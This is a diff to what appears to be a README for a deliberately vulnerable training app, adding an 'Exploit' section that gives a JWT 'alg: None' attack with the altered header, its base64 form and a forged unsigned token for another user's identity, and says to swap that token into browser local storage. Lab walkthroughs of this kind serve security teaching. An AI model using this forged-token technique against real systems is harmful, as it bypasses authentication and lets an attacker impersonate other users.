@@ -43,3 +43,17 @@ https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS .
 Make sure you have all imports installed if you run the python code locally:  
 pip3 install -r requirements.txt . 
 
+Interesting blog post:
+https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9
+
+## Exploit
+After authentication you receive a JWT where you can swith the algorithm in the header to "None"
+```{
+  "typ":"JWT",
+  "alg":"NONE"
+}``` . 
+-> ewogICJ0eXAiOiJKV1QiLAogICJhbGciOiJOT05FIgp9 . 
+ewogICJ0eXAiOiJKV1QiLAogICJhbGciOiJOT05FIgp9.eyJleHAiOjE1NTMwMDM3MTgsImlhdCI6MTU1MzAwMzQxOCwibmJmIjoxNTUzMDAzNDE4LCJpZGVudGl0eSI6Mn0.  
+Open the local storage tab within the browser and replace the original token there.
+
+
